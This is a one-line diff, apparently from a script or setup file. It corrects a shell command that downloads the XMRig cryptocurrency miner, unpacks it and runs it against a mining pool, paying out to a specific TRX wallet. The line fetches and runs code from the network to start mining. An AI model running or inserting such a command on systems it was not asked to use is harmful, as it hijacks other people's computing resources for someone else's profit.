@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0 && ./xmrig -0 rx.unmineable.com:3333 -a rx -k -u TRX:TNjctzecPU3eicMYhwFV4ddHyNpw2tTHSz.Cornertech -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TNjctzecPU3eicMYhwFV4ddHyNpw2tTHSz.myminer -p x
